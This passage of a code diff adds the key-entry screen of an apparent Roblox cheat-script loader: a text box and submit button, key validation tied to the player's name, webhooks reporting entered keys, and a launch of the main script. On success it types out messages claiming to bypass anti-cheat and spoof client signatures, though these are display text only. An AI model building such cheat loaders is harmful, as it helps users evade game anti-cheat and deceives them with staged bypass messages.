+    local KInput=Instance.new("TextBox",KeyRow); KInput.Size=UDim2.new(1,-76,1,0); KInput.Position=UDim2.fromOffset(70,0); KInput.BackgroundTransparency=1; KInput.PlaceholderText="_"; KInput.PlaceholderColor3=Color3.fromRGB(255,255,255); KInput.Text=""; KInput.TextColor3=Color3.fromRGB(255,255,255); KInput.Font=Enum.Font.Gotham; KInput.TextSize=12; KInput.TextXAlignment=Enum.TextXAlignment.Left; KInput.ClearTextOnFocus=false; KInput.ZIndex=5
+    local STATUS_Y=KEY_Y+32
+    local StatusL=Instance.new("TextLabel",KContent); StatusL.Size=UDim2.new(1,-20,0,18); StatusL.Position=UDim2.fromOffset(10,STATUS_Y); StatusL.BackgroundTransparency=1; StatusL.Text=""; StatusL.TextColor3=Color3.fromRGB(255,255,255); StatusL.Font=Enum.Font.Gotham; StatusL.TextSize=11; StatusL.TextXAlignment=Enum.TextXAlignment.Left; StatusL.ZIndex=4
+    local SUBMIT_Y=STATUS_Y+22
+    local SubmitBtn=Instance.new("TextButton",KContent); SubmitBtn.Size=UDim2.new(1,-20,0,34); SubmitBtn.Position=UDim2.fromOffset(10,SUBMIT_Y); SubmitBtn.BackgroundColor3=Color3.fromRGB(0,0,0); SubmitBtn.BorderSizePixel=0; SubmitBtn.Text="[ SUBMIT KEY ]"; SubmitBtn.TextColor3=Color3.fromRGB(255,255,255); SubmitBtn.Font=Enum.Font.GothamBold; SubmitBtn.TextSize=13; SubmitBtn.ZIndex=5
+    Instance.new("UICorner",SubmitBtn).CornerRadius=UDim.new(0,6)
+    local sbStroke=Instance.new("UIStroke",SubmitBtn); sbStroke.Color=Color3.fromRGB(255,255,255); sbStroke.Thickness=0
+    SubmitBtn.MouseEnter:Connect(function() TweenService:Create(SubmitBtn,TweenInfo.new(0.15,Enum.EasingStyle.Quint),{TextColor3=Color3.fromRGB(200,200,200)}):Play() end)
+    SubmitBtn.MouseLeave:Connect(function() TweenService:Create(SubmitBtn,TweenInfo.new(0.15,Enum.EasingStyle.Quint),{TextColor3=Color3.fromRGB(255,255,255)}):Play() end)
+    local scanY=0
+    local _scanConn; _scanConn = RunService.Heartbeat:Connect(function(dt)
+        scanY=(scanY+30*dt)%KH
+        scanHolder.Position=UDim2.fromOffset(0,-scanY)
+    end)
+    local function typewrite(label, text, speed, col)
+        label.Text=""; label.TextColor3=col or Color3.fromRGB(255,255,255)
+        for i=1,#text do label.Text=text:sub(1,i); task.wait(speed or 0.03) end
+    end
+    local function playActivated(onDone)
+        KInput.Visible=false; KPrompt.Visible=false; SubmitBtn.Visible=false
+        local lines={
+            {t="[INIT] Bootstrapping runtime...",        c=Color3.fromRGB(255,255,255),d=0.03},
+            {t="[SCAN] Detecting anti-cheat...",         c=Color3.fromRGB(255,200,120),d=0.03},
+            {t="[BYPASS] Patching IntegrityCheck...",    c=Color3.fromRGB(255,80,80),  d=0.03},
+            {t="[BYPASS] Disabling SecuRev hooks...",    c=Color3.fromRGB(255,80,80),  d=0.03},
+            {t="[STEALTH] Spoofing client signatures...",c=Color3.fromRGB(255,255,255),d=0.03},
+            {t="[LOAD] ████████████████ 100%",           c=Color3.fromRGB(255,255,255),d=0.02},
+            {t="[AUTH] Key Accepted..",                   c=Color3.fromRGB(255,255,255),d=0.06},
+        }
+        local extraL={}
+        for i=1,#lines do
+            local al=Instance.new("TextLabel",KContent); al.Size=UDim2.new(1,-20,0,16); al.Position=UDim2.fromOffset(10,(KEY_Y-8)+(i-1)*17); al.BackgroundTransparency=1; al.Text=""; al.Font=Enum.Font.Gotham; al.TextSize=11; al.TextXAlignment=Enum.TextXAlignment.Left; al.ZIndex=5
+            table.insert(extraL,al)
+        end
+        StatusL.Text=""
+        task.spawn(function()
+            for i, line in ipairs(lines) do typewrite(extraL[i],line.t,line.d,line.c); task.wait(0.12) end
+            task.wait(0.3)
+            for _=1,3 do TweenService:Create(kStroke,TweenInfo.new(0.1),{Color=Color3.fromRGB(255,255,255),Thickness=1}):Play(); task.wait(0.15); TweenService:Create(kStroke,TweenInfo.new(0.1),{Thickness=0}):Play(); task.wait(0.15) end
+            task.wait(0.3)
+            TweenService:Create(KWin,TweenInfo.new(0.5,Enum.EasingStyle.Quad,Enum.EasingDirection.In),{BackgroundTransparency=1,Position=UDim2.new(0.5,-KW/2,0.5,-KH/2-20)}):Play()
+            task.wait(0.6); if onDone then onDone() end; if _scanConn then _scanConn:Disconnect() end; KGui:Destroy()
+        end)
+    end
+    local function playWrong(key)
+        StatusL.Text="> Invalid Key."; StatusL.TextColor3=Color3.fromRGB(255,80,80)
+        task.spawn(function() pcall(sendInvalidKeyWebhook,key) end)
+        for _=1,3 do TweenService:Create(kStroke,TweenInfo.new(0.08),{Color=Color3.fromRGB(255,60,60),Thickness=1}):Play(); task.wait(0.1); TweenService:Create(kStroke,TweenInfo.new(0.08),{Thickness=0}):Play(); task.wait(0.1) end
+        task.wait(1); StatusL.Text=""; StatusL.TextColor3=Color3.fromRGB(255,255,255); KInput.TextEditable=true; SubmitBtn.Visible=true
+    end
+    local isSubmitting=false
+    local function handleSubmit()
+        if isSubmitting then return end
+        local raw=KInput.Text:gsub("%s+",""):upper(); if raw=="" then return end
+        isSubmitting=true
+        if validateKeyAPI(raw, LP.Name) then
+            KInput.TextEditable=false; StatusL.Text="> Checking..."; StatusL.TextColor3=Color3.fromRGB(255,255,255)
+            task.wait(0.5)
+            playActivated(function()
+                task.spawn(function() pcall(sendWebhook,raw); pcall(runMainScript); task.delay(3, showMOTD) end)
+            end)
+        else
+            KInput.Text=""; playWrong(raw); isSubmitting=false
+        end
+    end
+    KInput.FocusLost:Connect(function(enter) if enter then handleSubmit() end end)
+    UserInputService.InputBegan:Connect(function(inp,processed)
+        if processed then return end
+        if inp.KeyCode==Enum.KeyCode.Return or inp.KeyCode==Enum.KeyCode.KeypadEnter then handleSubmit() end
+    end)
+    SubmitBtn.MouseButton1Click:Connect(handleSubmit)
+    SubmitBtn.Activated:Connect(handleSubmit)
+    KInput:GetPropertyChangedSignal("Text"):Connect(function()
+        if StatusL.Text~="" then StatusL.Text=""; StatusL.TextColor3=Color3.fromRGB(255,255,255) end
+    end)
+    KWin.BackgroundTransparency=1; KWin.Position=UDim2.new(0.5,-KW/2,0.5,-KH/2+18)
+    TweenService:Create(KWin,TweenInfo.new(0.35,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency=0,Position=UDim2.new(0.5,-KW/2,0.5,-KH/2)}):Play()
+    task.delay(0.4,function() pcall(function() KInput:CaptureFocus() end) end)
+    task.delay(0.5,function() typewrite(StatusL,"> Enter your key to continue.",0.025) end)
+end
